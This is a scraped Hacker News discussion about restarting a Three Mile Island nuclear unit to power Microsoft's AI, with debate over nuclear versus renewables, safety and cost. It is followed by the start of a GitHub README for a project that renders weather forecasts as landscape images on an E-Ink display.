sufficiently large and diversified grid will largely cover itself, and when it doesn't, that's what peakers and so on will handle. reply bryanlarsen 4 hours agoparentprevFission is a bad complement for solar power. A good complement for solar provides dispatchable fill-in-the-gaps type of power. However, nuclear power plants cost about the same amount of money per hour whether they're running or not, so are poorly suited as a solar complement. You can get to 100% carbon free by using a combination of overprovisioning, source diversity, geographic diversity, storage and statistics. You can't get to 100% but you can get to an arbitrary number of nines and say \"good enough\". The grid is only 99.99% reliable so having generation be better than that has little value. If you really want 100% reliability out of a primarily-solar grid you choose something the opposite of nuclear: something cheap to build but expensive to fuel. For example, synthetic natural gas. The cost of the fuel has little relevance when it only has a duty cycle of 0.1%. And they're cheap to build and likely don't even need building because we already have lots of them. China built a lot of nuclear reactors in the 2010's, but is slowing their build rate. 10GW/year of nuclear power is not very impressive in a country that built 100GW of solar in the first half of 2024. That being said, I still support restarting TMI. The main costs of nuclear are in building and decomissioning them. We've already incurred the cost of building TMI and we're already on the hook for decomissioning it, so running it is likely cost-effective once you remove the sunk costs. reply NoMoreNicksLeft 4 hours agorootparent> However, nuclear power plants cost about the same amount of money per hour whether they're running or not, so are poorly suited as a solar complement. I think this is why they call it baseload. Yes it costs the same, used or unused... but it's always there, ready to be used. This is its strength, not a defect. > If you really want 100% reliability out of a primarily-solar grid But no reasonable person wants that. They want \"100% reliability, and who cares where it comes from\". If you're environmentally minded, you can tack on a \"with no carbon\"... but even that isn't the same thing as a \"primarily solar grid\". reply bryanlarsen 4 hours agorootparentbaseload is base load, not base generation. Base generation is not a thing. Way back when, they realized that grids had a base load below which it never dropped. They realized that if they designed some of their plants without the expensive features which allowed them to be turned on and off quickly, they could build plants cheaper. You don't design grids for base load, you design grids for peak load in all scenarios. If you can handle peak, you can also handle base. Baseload is for cost optimization. And nuclear is a horrible way to optimize cost. reply Suppafly 2 hours agoparentprev>No battery farm can protect a solar/wind grid from an arbitrarily extended period of bad weather. If you have N days of battery storage and the sun doesn't shine for N+1 days, you're in trouble. I'm in favor of nuclear too, but this is a ridiculous point. Your first sentence mentions solar and wind and your second only addresses solar. If the sun doesn't shine for n+1 days, the wind is still going to be available most or all of those days. reply jacoblambda 4 hours agoparentprevYou don't need battery farms to make renewables viable in the US. What you need is to replace the AC grid interconnect system in the US with a HVDC super grid system. The key difference here is that HVDC is exceedingly efficient in energy transfer and has effectively negligible losses compared to AC over distance. The US is big enough that any impact from weather should basically average out over that distance. reply EasyMark 4 hours agorootparentThere are huge downsides though because moving power generation further and further from where it’s used opens you up to more disruption from terrorist attacks on the grid (and cyber attacks) unless you also do less centralized production which is going to be more expensive. reply Ancapistani 2 hours agorootparent> moving power generation further and further from where it’s used opens you up to more disruption from terrorist attacks on the grid Not arguing, just asking - how is this different from how the Internet works? reply mhx1138 1 hour agoparentprevI personally could tolerate it if Microsoft’s “Ai” is down for a few hours or days per year. Give clippy a break. reply croes 1 hour agoparentprevA nuclear power plant needs supervision, if it can run N days without but there is no supervision for N+1 days, we are in big trouble. reply epoxia 5 hours agoparentprevThe issue of dunkelflaute is measurable and you can approach it the same way that storms are rated as being 100,1000-year storms. Not that I wouldn't appreciate more nuclear. reply bb88 1 hour agoparentprevI realize this isn't the HN popular opinion, but nuclear power will be great once: 1. People are educated about true risk AND forget about Fukushima, Three Mile Island, and Chernobyl. Or the need to have iodine pills if you live near one. (\"If it's so safe, why do I need the iodine pills?\") 2. Bad actors face actual prison time, not just corporate fines. Meanwhile, today, the bad actors still get bonuses. (You can kinda blame this one on the simpsons, but I do want for Christmas this year a Simpsons Springfield Isotopes Hockey Jersey with the 3-eyed fish. https://jerseyninja.com/springfield-iceotopes-simpson-hockey...) 3. We grow a lot of crops in the desert in the US. We need a lot of water to do that. There's gigawatts of solar potential there. And the cost of one reactor is $35B US for 1GW. For solar/wind you could have 10GW for around $10B US and then there's $25B US for batteries. reply janice1999 3 hours agoparentprevYou know nuclear power plants have issues in extreme weather too, right? [1] [1] https://arstechnica.com/science/2021/07/climate-events-are-t... reply exe34 4 hours agoparentprevand remember, it's only fair to include the cost of carbon capture to return the carbon into the soil, since the cost of nuclear in these discussions will include both the cost of disposal and cleanup of disasters that only happen several continents away. reply greenthrow 5 hours agoparentprevThis is nonsense. If you're going to cite arbitrary \"N+1 days of bad weather\" then I can cite \"N+1 severe natural disasters\" where the nuclear reactor is engineered to withstand N. And unlike the theoretical \"disaster\" due to extended bad weather taking renewables down, this has actually happened in recent memory with Fukushima. And this was a true disaster, not just a power outage. Nuclear is not safe. Every time proponents say \"new designs are safe\" eventually a new disaster proves this lie. Then the nuclear proponents say \"oh well that was an old design, new designs are safe!\" Nuclear is too expensive. Renewables even with storage are way cheaper! We can way over build renewables. We can distribute them, because \"bad weather\" is regional. All for much cheaper than nuclear. Stop pushing this out-dated, unsafe and expensive technology. Its time has passed. reply Ukv 4 hours agorootparent> Nuclear is not safe Nothing is 100.0% safe - but as far as I can find nuclear comes incredibly close[0] even when including Chernobyl and Fukushima. [0]: https://ourworldindata.org/safest-sources-of-energy reply anigbrowl 3 minutes agorootparentSuppose you have a devastating earthquake that wrecks renewable power sources in an area. Bad part is you're out of power for a good while. But the second-order risks are very low - maybe some people are killed by falling wind turbines or solar panels, but there isn't any equivalent of radioactive contamination making the place uninhabitable for years. reply janice1999 3 hours agorootparentprevTaking about just deaths is misleading. Accidents in other energy sources don't render 1,000 square miles of land uninhabitable. reply Ukv 1 hour agorootparentIn terms of single-incident, I believe hydro takes the lead due to the Banqiao Dam failure (floods over 12,000 square kilometers killing ~30k directly then ~100k more from water contamination and famine). But even that's still dwarfed by the more gradual impact of climate change on the planet from fossil fuels. reply 0x000xca0xfe 1 hour agorootparentprevDam failures absolutely destroy vast areas and can contaminate them with oil and gasoline by flooding settlements. In fact hydroelectric power has killed a surprising amount of people. reply greenthrow 3 hours agorootparentprevFocusing on deaths is a nice trick of the nuclear industry because the largest negative impacts of their disasters and even non-disaster costs of operation are still terrible but do not manifest as immediate deaths. reply Ukv 3 hours agorootparent> but do not manifest as immediate deaths. This isn't just counting immediate deaths - else it'd just be ~30 for Chernobyl and ~0 for Fukushima. In fact, Fukushima's death count seems to primarily be down to that \"people had died indirectly as a result of the physical and mental stress of evacuation\" - which I feel should at least partially be put on the tsunami that killed 20000. reply edmundsauto 4 hours agorootparentprevTo be fair, the unsafe designs are all 50 years old because of FUD from incidents that are also generally pretty old. I’m not sure it’s comparable to modern designs - this isn’t a “new iPhone every year” deal. reply greenthrow 4 hours agorootparentGet out of here with this lie. Before the disaster, nuclear proponents cited Fukushima as an example of how safe modern nuclear was. reply V__ 5 hours agoprev> Constellation, which plans to spend about $1.6 billion to restart the plant, is awaiting permits and expects the facility to come online by 2028 [and] would provide Microsoft with 835 megawatts of energy. I don't quite understand how this makes sense financially for Microsoft. A 1 GW offshore wind farm costs about 1 billion [1]. The Gemini Solar + Battery Storage Project in Nevada is about 1.1 billion (690 MW + 380 MW battery). [2] With solar, wind and battery prices continuously trending downwards, how does it make sense to invest in nuclear which nearly always has cost overruns, bad PR and unknown potential future costs? [1] https://businessnorway.com/articles/cost-of-wind-turbines [2] https://commercialsolarguy.com/americas-first-gigawatt-solar... reply Workaccount2 4 hours agoparentAs some with contact to the the nuclear industry: These old plants are ridden with hidden costs, and I would bet all of my money no one at Microsoft is aware of the scale of this. I'm not talking \"hidden costs\" like you didn't do your homework. I'm talking hidden costs like you need to be on the inside, on the ground, to know about. Hidden costs like \"everyone subtly nods but doesn't say it out loud\" kind of hidden costs. The NRC has beyond suffocating regulation for nuclear energy. This is maybe a good thing in some regards. But let me put it this way: Imagine you bought a car from 1975 and could _only_ put in original parts. Need a new battery? Better find out how to get a factory one from 1975. Can't get one from 1975? Be prepared to pay millions, perhaps tens of millions, for a mountain of testing and certification for a new $100 part that is still just an off the shelf battery. reply brookst 3 hours agorootparentBut the actual investor is Constellation, which has operated the plant for decades. Microsoft is just committing to buy power. Are you suggesting Constellation will be surprised at the hidden costs? reply Workaccount2 3 hours agorootparentIt's hard to say without knowing the details of the contract. I highly doubt Constellation put themselves in a position to be vulnerable to cost overruns. Or perhaps they see the deal as a shiny pendant they can dangle in front of dumb PE money when they want to cash out in the future. Trust me, cynicism is well warranted with these ancient plants. reply phil21 5 hours agoparentprevHow many MWH does that battery array store? MW is a useless number for energy storage. HN should know better. Edit: The article linked states: > Roughly, one could assume that the energy storage portion of the project – 1.4 GWh worth So, at the 690GW (which is unrealistic) nameplate capacity of the solar field, they are installing roughly 120 minutes worth of energy storage to back it. This is actually a better number than most projects I've seen, but still utterly inadequate and representative of the typical project. reply ZeroGravitas 3 hours agoparentprevYou'd need to adjust those for capacity factor, but I wondered the same thing. The AI space seems to have weird overlaps with nuclear that I don't quite get. Not sure if it's just the social circles the AI people run in. Zuckerberg was all excited on a podcast about how energy was the limiting factor for AI, waited for him to say something about how cheap and fast rollouts of renewables made sense but no, nuclear. Even this refurb is talking minimum 4 years to get going. All very strange. reply freeqaz 5 hours agoparentprevMaybe the lead time is faster because refurbishing a plant is easier than building one from scratch? Just speculating but that comes to mind for me. If their need is immediate term then this could be the \"throw some money at the problem to make it go away\". Also maybe good for PR? reply AnimalMuppet 5 hours agorootparentI doubt that anything that connects to the name \"Three Mile Island\" is going to be good for PR. reply 39896880 4 hours agorootparentNo one died from the incident at Three Mile Island, so I hope that with better access to information people can be persuaded to change their minds. reply brookst 3 hours agorootparentNot to mention this nuclear reactor was only shut down in 2019. They're upgrading and recommissioning something that was mothballed because the economics didn't work, all of five years ago. People reacting to the name are imagining that this means re-opening the other unit, which melted down in 1979. It's more fun to imagine and react to that than to learn that this was an operational plant until a few years ago. reply Suppafly 2 hours agorootparentprev>I doubt that anything that connects to the name \"Three Mile Island\" is going to be good for PR. This. I'm surprised they didn't figure out a way to rename the place first. reply himinlomax 5 hours agoparentprev> A 1 GW offshore wind farm costs about 1 billion A 1 GW offshore wind farm does not produce anywhere close to 1 GW most of the time. A 1 GW nuclear reactor can produce 1 GW 90%+ of the time, with the downtime being _scheduled_ maintenance. reply epistasis 47 minutes agorootparentNuclear plants trip off all the time. It was a big problem in one of Texas' recent cold snaps where people died. And many of those nuclear down times are for month+ times. Good luck getting enough batteries to get through that! Offshore wind typically has a capacity factor of ~50%. Add a smaller number of batteries than you would need for nuclear, and it's going to be cost competitive against any new build. As far as if it's cost competitive with TMI, I'm not so sure. New build nuclear is likely going to be >$190/MWh. Running the numbers being bandied about for the \"Pennsylvania GDP increase\", which is a really funny way to say \"cost of the electricity for 20 years,\" and you get $115/MWh. Which is really pricy still. I'm not saying that it's a bad idea to get TMI going again, just that it's pricy, and there's likely lots of other constraints that went into deciding to do this. reply greenthrow 5 hours agoparentprevIt makes no sense. Bill Gates is a huge nuclear proponent for bad reasons and I'm sure somehow this is related, wherher it's just that Microsoft decision makers have read his bad takes or because he actually pushed for this terrible idea. reply 1970-01-01 5 hours agoprevMore nuclear is a good thing. FAANG nuclear is even better, because they will be be ready and equipped to push back the insane NIMBY crowd(s) and also don't need to be worried about getting reelected. reply fergonco 5 hours agoparentHow are nimby crowds insane? Accidents may happen. And did happen in the past in that same place: https://en.wikipedia.org/wiki/Three_Mile_Island_accident reply alright2565 5 hours agorootparentCoal plants have killed a minimum of 500k people over the past 20 years[1]. It's not an accident in that case, it's known and planned for (or at least easily predicted enough that it should have been). But when a few hundred people, or really just 0 people[2] die in one place at one time, people lose their minds. [1]: https://www.theguardian.com/environment/2023/nov/23/coal-pow... [2]: An inter-agency analysis concluded that the accident did not raise radioactivity far enough above background levels to cause even one additional cancer death among the people in the area https://en.wikipedia.org/wiki/Three_Mile_Island_accident reply Symmetry 4 hours agorootparentI tried to do the math once to figure out if Japan would have been better off building a coal power plant instead of Fukushima, the nuclear plant that had the worst disaster in any western country. It was a surprisingly tough question. https://hopefullyintersting.blogspot.com/2013/12/fukushima-v... reply jandrese 6 minutes agorootparentThose studies of coal plant deaths are basically only counting people who died in mining disasters or were killed while operating the power plant. If you add in climate change effects, air pollution including radiation from flyash, and groundwater pollution the figure is almost certainly much worse; but also very hard to calculate with any certainty. reply fergonco 1 hour agorootparentprevWell, not coal plants but emissions. I guess those nymbis would also be against having all that pollution concentrated in their back yard. My point is that it is not insane. Maybe selfish. Not willing to have risks with potential catastrophic results near your home is the most normal thing. And with nuclear, the probability is very low, as with planes. Yet it happens. All the time. Our generation went through three once in a lifetime crisis in the last two decades. reply Y-bar 5 hours agorootparentprevI’m not the person you responded to, but have an honest question here since we are specifically talking about NIMBYism: How much less of NIMBY is there against coal power plants? For example are there examples of people rejecting NPP in their vicinity while accepting CPP? reply organsnyder 5 hours agorootparentThe worse impacts of coal plants disproportionately impact disadvantaged communities that don't have the resources to be effective NIMBYs. Coal also has a much wider low-level impact: for instance, it's not safe to consume more than small amounts of fish from the great lakes because of mercury levels, largely due to coal power plants. reply roenxi 5 hours agorootparentprevThey get a fairer run than nuclear - it is conceivable that a coal plant gets built and is allowed to run. However I imagine the US followed the same broad trends as everyone else in the 90s and started restricting infrastructure construction for environmental reasons so it is probably quite challenging to get a plant built. There is a reason all the growth is happening in Asia. Their focus is on improving their wealth and material standard of living. reply wickedsight 5 hours agorootparentprevGermany has been closing tons of nuclear power plants because of protests. They've recently also moved an entire town and a highway to make space for digging up more coal. I'm not really answering your question, but it does seem like nuclear NIMBYs are more effective than other ones. reply elil17 5 hours agorootparentprevHow is that a valid comparison though? Fighting against a coal plant makes sense, fighting against a nuclear plant doesn't - that's the key difference. reply Y-bar 5 hours agorootparentThe context of the discussion is Not In My Backyard-protests and blocking of plants. Are the people protesting one in their “backyard” not protesting the other? reply AdamN 5 hours agorootparentprevFirst off - plenty of people are against coal plants for health reasons in addition to the environmental reasons. There is nobody cheering coal and blocking nuclear (and please don't bring up the Germany decommissioning of nuclear plants and keeping open coal plants because it doesn't speak to what I just said). Secondly, Three Mile Island represents the path to a possible outcome. Just because disaster was averted doesn't mean that the thinking about safety shouldn't be focused on the worst case scenario instead of the one that actually happened. reply elil17 5 hours agorootparentprevThat's just 500k Americans - far more people have been killed globally. reply elil17 5 hours agorootparentprevIt's insane because killing people is the modus operandi of fossil fuel power - and I'm not even talking about climate change. People often die on oil fields and in mines, toxic waste from coal plants leaches into our water supply, and ash enters our air and causes asthma and heart problems. Coal alone has killed about 460,000 Americans in the 21st century: https://www.theguardian.com/environment/2023/nov/23/coal-pow... Nuclear power plants, in contrast, very rarely have issues: https://ourworldindata.org/grapher/death-rates-from-energy-p... reply weberer 5 hours agorootparentprevIts crazy how this resulted in 0 deaths, yet it pretty much halted nuclear power production for good in the US. reply brookst 5 hours agorootparentprevIf only safety was a matter of system design and operational practices, not geographic location. reply unglaublich 5 hours agorootparentprevBecause the alternative, fossil fuel generation, is much, much more polluting and deadly. reply Nullabillity 5 hours agorootparentAnother alternative would be to not build the datacenter... reply ziddoap 5 hours agorootparentIn this specific case? Sure. But power needs are increasing whether this datacenter is built or not, so the discussion regarding nuclear has to happen in some context regardless. reply 1970-01-01 5 hours agorootparentprevAccidents will happen daily. Those accidents are extremely well controlled. You are providing an excellent example by jumping to that insane NIMBY conclusion. I think MS can successfully bulldozer these extremely weak arguments about catastrophic accidents better than I could. Stay tuned. reply mpweiher 4 hours agorootparentprevWhat were the effects of the TMI accident, in your opinion? reply himinlomax 4 hours agorootparentprevNobody died at TMI. Nobody died at Fukushima (from the nuclear incident that is, 10000 died because of the Tsunami) Hundreds of people died at Chernobyl. Those are all the major accidents at production nuclear power plant that have ever occured. There are no others. There is just one that was deadly, and it is about as representative of the safety of nuclear power as flying in a 1920s' plane compared to a state of the art Airbus. reply rebolek 5 hours agoparentprevYeah, 'move fast and break things' is certainly the best ideology for running nuclear plant. reply ziddoap 5 hours agorootparentMicrosoft is not operating the nuclear plant, so that ideology isn't being applied to the operation of the plant. reply bastawhiz 5 hours agorootparentprevMicrosoft engineers aren't running the power plant. reply VoodooJuJu 5 hours agoparentprevA corporation getting its way, irrespective of the democratic will of the people, or rather, those \"insane NIMBYs\". Corporatocracy truly is a beautiful thing. reply burnte 5 hours agorootparent> A corporation getting its way, irrespective of the democratic will of the people, or rather, those \"insane NIMBYs\". Corporatocracy truly is a beautiful thing. Generally a NIMBY is anti-progress and very selfish, putting themselves ahead of everyone. My dad was called to help resolve TMI during the meltdown and was part of the engineering design group the the Beaver Valley nuclear power station. People were complaining they had cows dying of radiation years before the plant was completed. NIMBYs suck. reply VoodooJuJu 5 hours agorootparent>a NIMBY is anti-progress And what is \"progress\"? We both have ideas about what progress is. Are mine the same as yours? reply skeaker 1 hour agorootparentIn this context, progress would probably refer to moving to a power source that doesn't kill people or destroy the planet. I think that is generally pretty agreeable even if you want to get into a definitional argument. reply ToValueFunfetti 4 hours agorootparentprevDoes your definition of progress say that a civilization that gets safer, cheaper, carbon-neutral power has progressed? reply lopis 5 hours agoprevWhile this is better than loading up a coal power plant, the way I see it, it's still a tragic situation. Even if AI used purely fossil-free electricity (which it doesn't), it's still putting pressure on our grids and energy production. The green energy AI consumes if the green energy some other less lucrative industry will not consume. Big tech is currently scraping their net neutrality plans left and right... reply throwaway48540 5 hours agoparentWhat exactly is the problem? That they're using any energy at all? Well, I don't like that people have lights on after 7 PM... reply unglaublich 5 hours agoparentprevYeah, that's how economies work? If someone offers more for a resource, they get it. More incentive to build better grids. reply Yawrehto 29 minutes agoprevSomething that isn't discussed enough is that nuclear power is extremely safe. According to Our World In Data (https://ourworldindata.org/safest-sources-of-energy), it produces the fewest emissions per gigawatt -- solar and wind both have substantial overhead -- and the second-fewest deaths, after solar, of coal, oil, natural gas, biomass, hydropower, wind, solar, and coal. The misguided perception nuclear is more dangerous is due to its unfortunate habit of clumping deaths. People remember Chernobyl, but not Bill, who died mining coal, even if there are a thousand Bills all over, their total deaths dwarfing Chernobyl's. The climate activists should really be advocating for nuclear. It's cheap, has the lowest emissions, and is really safe. But, of course, people will object. It's hard for PR to say that, even if you can show the data. People rarely change their mind because of data. reply Tade0 19 minutes agoparent> It's cheap That hasn't been the case for at least a decade now - not after safety requirements were brought to where they are now. And that 60-80 year lifetime which is supposed to spread the cost is a myth. Most plants are decompressioned before they turn 40 years of operation: https://www.statista.com/statistics/272139/age-distribution-... reply gkfasdfasdf 5 hours agoprevWas anyone else horrified because they thought the powerplant was going to be run by a Microsoft AI? (TFA is about Microsoft purchasing nuclear power to run their AI) reply SketchySeaBeast 5 hours agoparentNuclear powered Clippy. reply AnimalMuppet 5 hours agorootparentWorse: Clippy running a nuclear plant. reply bt1a 5 hours agorootparentAs an AI assistant, I'm not equipped or trained to handle an ongoing nuclear meltdown.. reply mikeortman 5 hours agoprevI feel like we are living in an episode of the Simpsons at this point reply nikau 5 hours agoparentexcept the electron app running the powerplant cant respond fast enough to the nodding duck reply marcodiego 5 hours agoprevNuclear plant, microsoft and AI on the same phrase. What could possibly go wrong? reply jcgrillo 6 minutes agoprevThere's something glorious about the optics of using one toxic disaster to power another. reply Kon-Peki 5 hours agoprevThis article says it will be the first restarted nuke. But there is also a restart in process in Michigan. Will this beat the Michigan one into full operation? reply ChrisArchitect 4 hours agoprevRelease from Constellation Energy: https://www.constellationenergy.com/newsroom/2024/Constellat... reply bfrog 5 hours agoprevPresumably all the things that have gone wrong have been fixed? I can honestly say the micro reactors and pebble beds look far more fail safe than the typical PWR/BWR that must have power and a pump running as I understand things to prevent catastrophe. reply connicpu 1 hour agoparentThe Three Mile Island incident happened in one reactor at this plant in 1979, but the plant kept operating its other reactors without any further incidents until they shut down in 2019 due to economic pressures (primarily the low price of natural gas). reply RandomLensman 5 hours agoprevWait and see if this will actually be up and running by 2028 at the costs indicated. reply jprete 4 hours agoprevI'm generally in favor of nuclear, but the symbolism of reopening Three Mile Island for AI power is strikingly anti-human. reply ck2 41 minutes agoprevFeels like right out of a Westworld plot. Wait, it literally was. So someone is paying massive insurance premiums on this right? Not \"privatize the profits, socialize the costs\" right? reply cpascal 5 hours agoprevSo how would this work? Does this mean Microsoft will build a directly connected data center nearby? Or is Microsoft just buying power from the plant's owner on the energy market? reply rgmerk 5 hours agoparentPresumably they’ve signed an agreement to buy the power (delivered through the grid) from the plant operator at a contracted price. The plant operator can then get finance for the work required to actually deliver on the contract. A lot of renewable energy projects were financed through similar agreements, called PPAs. reply burkaman 5 hours agoparentprevThey are just buying the power. Microsoft's goal is 24/7 matching, so every MWh of power they use is matched by a MWh of clean power (generated in that same hour) that they paid for. This is called market-based carbon accounting, as opposed to location-based accounting which considers the source of the electricity that is actually used by the company's infrastructure. There are pros and cons of each approach, market-based is a little less intuitive but not necessarily worse, it depends on the application. reply aziaziazi 4 hours agorootparent> market-based carbon accounting […] not necessarily worse They are better for the corps communication and worse for anyone else. Transporting electricity over distance has a non trivial cost in $ but also ressources and energy, as well as relocating an industry near a clean energy source or optimizing the production units. Carbon-matching systems are great for entreprise wanting to claim they don’t produce carbon (24/7 carbon neutral) while they do. It does not depict the CO2E one (entreprise) did product de facto. reply rdl 5 hours agoprevWow. AI has already accomplished more positive in a few years of big commercial stuff (admittedly as a side effect) than cryptocurrency has since, say 2009. :( reply nancybelowzero 5 hours agoparentCrypto created a trillion dollars out of thin air (well, slightly thicker air from more CO2). AI is poised to do the same, but also has already polluted the entire internet with worthless slop. reply lopis 5 hours agoparentprevHow is this positive news? reply izzydata 5 hours agorootparentIf using a ton of energy has to happen then I'd prefer it be generated from nuclear, but I don't see the need to supply LLM data centers with a ton of energy as a positive. reply rdl 5 hours agorootparentprevSolving the political problems behind nuclear power (getting TMI restarted being one of the more difficult politically but easier technically), and generally bringing the \"build more nuclear\" to forefront. (Although to be fair there's been a fair bit of wind and solar subsidized heavily by crypto, as well as flare gas power generation, and a bit of PV solar) reply nancybelowzero 5 hours agoprevAI might be the thing that ends badly this time. Better than using fossil fuels for it though. reply jameshart 5 hours agoprev> restart one of the units at the noted Three Mile Island nuclear plant in Pennsylvania Ah yes, the ‘noted’ Three Mile Island. I wonder why this particular plant enjoys a degree of fame? The name certainly is familiar… Seems like a rebranding might have made sense - like the UK switched Sellafield to Winscale. reply jonkoops 5 hours agoparentIMHO a infamous reactor such as Three Mile Island re-starting, if successful is only good publicity in the resurgence of nuclear power. reply sesm 5 hours agoparentprevJust rebrand it to Five Kilometer Island. reply voxadam 4 hours agorootparentGetting Americans to accept the metric system is probably a taller order than getting them to accept nuclear power. reply kaliqt 5 hours agorootparentprevHah, good one. reply tomohawk 4 hours agoprevClassic SNL skit from when it was originally shut down. https://vimeo.com/357925913 reply swozey 5 hours agoprevMy sister is a geologist who works at nuke plants (regulatory stuff, determing if they're in legal areas to build, ground contamination, etc). She always complains that it's an old-mans (this was in her 20s, 20 years ago) group of staff everywhere with guys who had incredibly light educations on what they're actually working on and had been in the business, and sometimes at the same plants, for decades. Some 40-50+ years. We might have a severe lack of people who can work in the field at plants and tech getting involved is probably a good thing on making that field more prominent for new students than it currently is. \"Nuclear Engineer for Microsoft\" is a cool title. reply mc32 5 hours agoprevnext [3 more] [flagged] karaterobot 5 hours agoparentI don't think insults are called for, but I directionally agree that protests against atomic power, largely based on needless fear and lack of understanding, caused the world a lot of damage. If we could compare the world we have today to the counterfactual where anti-nuclear protests hadn't stopped progress, I believe a lot of people would be ashamed of their actions. Some already are. But the net effect of the anti-nuclear movement was to prolong the use of fossil fuels by many critical decades. reply mc32 5 hours agorootparentI am angry because if it had not been for her and the movement that rode on her coattails, we'd long have been weened substantially from fossil fuels and we'd be in a very different world today. She caused this. She is not even owning it; though it can't be undone. She is responsible for more damage to the environment than GW Bush or Shell Oil. People don't realize the magnitude of the damage she inflicted. reply lobochrome 5 hours agoprevFascinating. How will we live ok back in, say five years, at this very funny period from, 2018ish to 2022ish when our echo chamber made us believe ESG was going to save the world. How far we’ve come. Is it all due to the prospect of finally seeing a feasible road to AGI?! reply tivert 5 hours agoparent> Is it all due to the prospect of finally seeing a feasible road to AGI?! Or just hope. AGI is a capitalist's wet dream: it would completely undercut labor's power or allow it to be replaced completely, and it could also allow the developer to muscle out a large fraction of other capitalists from the economy. Even though AGI would be terrible for the rest of us, it's got so much upside for VC types they can't help themselves. reply baq 5 hours agorootparentIt’s even worse. If you have money and are against deploying AGI once we get there you still want to be the first to achieve it, because it’s the only reasonable chance of stopping others… assuming you can even align it. reply throwaway48540 5 hours agorootparentprevYou're claiming it would be terrible for the rest of us, without supporting that assumption in any way. It's not a fact, pseudo scifi action movies don't count as facts. reply llamaLord 5 hours agorootparentHe's talking about the economic consequences. AGI in an internet connected world is capitalism end-game. Once you have AGI, labour (both physical and intellectual) becomes redundant, humans have a \"value to the system\" approaching zero. Our economic system is built on a series of assumptions that fundamentally cannot survive AGI, and nobody is really even trying to grapple with that fact. reply throwaway48540 3 hours agorootparentThe economic system is not set in stone. If everyone is irrelevant to it, the economic system becomes irrelevant to everyone, and a parallel system gradually replaces it. reply anticensor 2 hours agorootparentSadly \"earning a living\" goes beyond economy, it is also deeply involved in societal and cultural values. reply throwaway48540 1 hour agorootparentIt really isn't. Just 100 years ago \"earning a living\" meant growing food themselves on fields behind the house for the majority of humans. reply mc32 5 hours agoparentprevESG ended up being a scam. Lots of these things are nothing but cover to make money off of people’s concern for the enviro. All you need to look at is the carbon footprint of people who clamor and demonstrate for green policies. Including idiots gluing themselves to roadways —all the idle traffic they create and the manpower necessary to remove them and repair the damage. It’s a sucker’s game. reply brookst 5 hours agorootparentSaying ESG is entirely a scam because some ESG backers travel in airplanes is like saying climate change is a hoax because it was colder than usual in Peoria today. ESG is a huge thing. Some of it is greenwashing, some is outright scam, some is legitimate pressure to make better environmental decisions. But insisting that ESG proponents can’t make suboptimal individual choices is silly. reply 4fterd4rk 4 hours agorootparentprevAh yes. Some people use airplanes so we need to keep burning coal, who cares when the sea levels rise and the water wars begin! The important thing is that some people acted silly by gluing themselves to the road! Can't give in to them, even if it would save the world for our children. reply mc32 4 hours agorootparentYou're not trying to convince the choir, you're trying to convince the masses. Sure, Leonardo DiCaprio, Richard Branson, Albert Gore, Barrack Obama and high schoolers are impressed, but not the mom and dad working jobs that are teetering, driving beaters and facing pressure from cheap labor. They see these people jet-setting being hyper-overconsumers and think, what the hell? They see these people increasing their wealth promoting change, but they don't change. Why should I change, they're not changing, they're adding more! reply rgmerk 5 hours agoprev [–] Hmmm. 50 years old and out of action for half a decade. That’s going to require a lot of work to persuade the NRC it’s safe to operate. Given how difficult it’s proven to build new nuclear around the world, what are the odds of this recommissioning being on time and budget? reply rdl 5 hours agoparentIf the recommissioning requires 20% of the work of new-build (in time and money), I'd rather have the \"normal\" 50-100% overrun in costs and time happen on recommissioning vs new-build. The delay is usually heavily on the permitting/legal challenges/etc. stage, not actual concrete-pouring and equipment installation, so an already-once-permitted site will probably do better relatively, too. Extra reactors at exising operating sites would make even more sense, though. Putting 2-4 extra AP-1000 at ~1GW/ea at each of the 54 facilities operating today would be huge and minimal incremental risk, and if there were a shortcut one time permitting process for it... reply mpweiher 4 hours agoparentprevIt turns out that nuclear is easy to build around the world. Average construction times have been more or less constant the last five decades and are currently at 6.5 years (trend: slightly falling). Median (typical) time is lower. https://www.sustainabilitybynumbers.com/p/nuclear-constructi... reply weberer 5 hours agoparentprev [–] They're not restarting reactor 2. They're starting the one that shut down in 2019. reply wffurr 5 hours agorootparent2019 was half a decade ago. reply AnimalMuppet 5 hours agorootparentprev [–] I think the GP knows that. That's why they said \"out of action for half a decade\". reply weberer 5 hours agorootparent [–] Oh, I misread. Never mind then reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "Three Mile Island nuclear plant will restart to power Microsoft's AI operations, with Constellation investing $1.6 billion to bring it online by 2028, providing 835 megawatts of energy.",
      "The deal underscores the reliability of nuclear power compared to solar and wind, particularly during prolonged adverse weather conditions.",
      "The discussion includes considerations of nuclear power's high initial costs, long-term low fuel costs, and public safety concerns, referencing past incidents like Three Mile Island, Fukushima, and Chernobyl."
    ],
    "points": 128,
    "commentCount": 207,
    "retryCount": 0,
    "time": 1726836209
  },
  {
    "id": 41603546,
    "title": "Visualizing Weather Forecasts Through Landscape Imagery",
    "originLink": "https://github.com/lds133/weather_landscape",
    "originBody": "Weather as Landscape Visualizing Weather Forecasts Through Landscape Imagery Traditional weather stations often display sensor readings as raw numerical data. Navigating these dashboards can be overwhelming and stressful, as it requires significant effort to locate, interpret, and visualize specific parameters effectively. Viewing a landscape image feels natural to the human eye. The calming effect of observing landscape elements reduces stress and requires minimal effort, allowing for a more relaxed visual experience. The method below demonstrates how to encode weather information within a landscape image, with no or minimal reliance on numerical data. Encoding principles The landscape depicts a small house in the woods. The horizontal axis of the image represents a 24-hour timeline, starting from the current moment on the left, marked by the house, and extending to the conditions of the next day on the right. Various landscape elements distributed along the vertical axis symbolize weather events and conditions. The further an event is from the present, the farther it is positioned to the right in the image. The following information can be encoded within the landscape image: Time markers to simplify timeline navigation: Sunrise and sunset times Noon and midnight Weather forecast information: Wind direction and strength Temperature fluctuations Maximum and minimum temperature values Cloud cover Precipitation Current weather conditions: Temperature Atmospheric pressure Non weather events: Birthdays Holidays Implementation The image generation code is written in Python using the Pillow library and is based on data from OpenWeather. The image is designed specifically for use on a 296x128 E-Ink display. The code tested on Python 3.9. Event image DescriptionSunriseSunsetCloud coverCurrent time positionMidnightMiddaySouth windEast windWest windNorth windRain Examples Landscape image DescriptionIt’s around noon, with clear skies and a few clouds expected. A moderate north wind will develop overnight. Temperatures are currently rising but will begin to fall after sunset, reaching their lowest point before sunrise. During this time, the wind is expected to shift to the northeast.The sun is rising and it will be a hot sunny day with a light southeast breeze. The temperature will remain high even after sunset, and the wind will shift to the east, becoming stronger throughout the evening.It will be cold and rainy throughout the day and night. The south wind will shift to the northeast overnight. Running the code Preparing environment Linux 